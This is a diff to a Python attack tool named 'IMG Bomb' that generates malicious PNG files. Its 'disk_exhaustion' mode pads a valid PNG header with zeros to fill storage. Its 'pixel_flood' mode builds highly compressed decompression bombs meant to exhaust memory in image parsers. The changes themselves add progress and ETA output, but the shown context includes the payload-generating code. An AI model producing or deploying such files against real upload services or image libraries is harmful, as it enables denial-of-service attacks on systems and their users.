@@ -8,15 +8,16 @@ import os
 import sys
 import zlib
 import struct
+import time
 
 def mostrar_banner():
-    banner = """┌───────────────────────────────────────┐
-│                             ,--.!,    │
-│      IMG Bomb v1.0.1     __/   -*-    │
-│                         ,d08b.  '|`   │
-│        @far00t01        0088MM        │
-│                         `9MMP'        │
-└───────────────────────────────────────┘"""
+    banner = """┌──────────────────────────────────────┐
+│                            ,--.!,    │
+│      IMG Bomb v1.0.2      __/   -*-  │
+│                          ,d08b.  '|` │
+│        @far00t01         0088MM      │
+│                          `9MMP'      │
+└──────────────────────────────────────┘"""
     print(banner)
 
 def calcular_bytes(cantidad, unidad):
@@ -46,14 +47,32 @@ def disk_exhaustion_mode():
             nombre_salida = f"disk_exhaustion_{cantidad}{unidad}.png"
             png_header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\xcf\xc0\x00\x00\x03\x01\x01\x00\x18\xdd\x8d\xb0\x00\x00\x00\x00IEND\xaeB`\x82'
             
+            inicio_tiempo = time.time()
+            bytes_escritos = 0
+
             with open(nombre_salida, 'wb') as f:
                 f.write(png_header)
+                bytes_escritos += len(png_header)
+                
                 if bytes_totales > len(png_header):
                     bytes_restantes = bytes_totales - len(png_header)
                     while bytes_restantes > 0:
-                        escribir = min(bytes_restantes, 1024 * 1024)
+                        escribir = min(bytes_restantes, 1024 * 1024) 
                         f.write(b'\x00' * escribir)
                         bytes_restantes -= escribir
+                        bytes_escritos += escribir
+                        
+                        tiempo_pasado = time.time() - inicio_tiempo
+                        porcentaje = (bytes_escritos / bytes_totales) * 100
+                        
+                        if tiempo_pasado > 0:
+                            velocidad = bytes_escritos / tiempo_pasado  
+                            bytes_que_faltan = bytes_totales - bytes_escritos
+                            eta = bytes_que_faltan / velocidad  
+                            
+                            print(f"\r├── [+] Writing: {porcentaje:.1f}% | ETA: {eta:.1f}s | Speed: {velocidad / (1024**2):.1f} MB/s", end="", flush=True)
+
+            print() 
 
             peso_real_bytes = os.path.getsize(nombre_salida)
             peso_real_mb = peso_real_bytes / (1024 * 1024)
@@ -95,11 +114,28 @@ def pixel_flood_mode():
         compressor = zlib.compressobj(level=9)
         idat_compressed_data = b""
         
+        inicio_tiempo = time.time()
+        
         for i in range(alto):
             fila_actual = row_p1 if i % 2 == 0 else row_p2
             idat_compressed_data += compressor.compress(fila_actual)
-        idat_compressed_data += compressor.flush()
+            
+            if i % 500 == 0 or i == alto - 1:
+                filas_procesadas = i + 1
+                tiempo_pasado = time.time() - inicio_tiempo
+                porcentaje = (filas_procesadas / alto) * 100
+                
+                if tiempo_pasado > 0:
+                    velocidad = filas_procesadas / tiempo_pasado 
+                    filas_restantes = alto - filas_procesadas
+                    eta = filas_restantes / velocidad  
+                    
+                    print(f"\r├── [+] Compressing: {porcentaje:.1f}% | ETA: {eta:.1f}s (Row {filas_procesadas}/{alto})", end="", flush=True)
 
+        idat_compressed_data += compressor.flush()
+        print()  
+
+        print("├── [+] Writing finalized data to container structure...")
         with open(nombre_salida, 'wb') as f:
             f.write(png_signature)
             write_png_chunk(f, b'IHDR', ihdr_data)
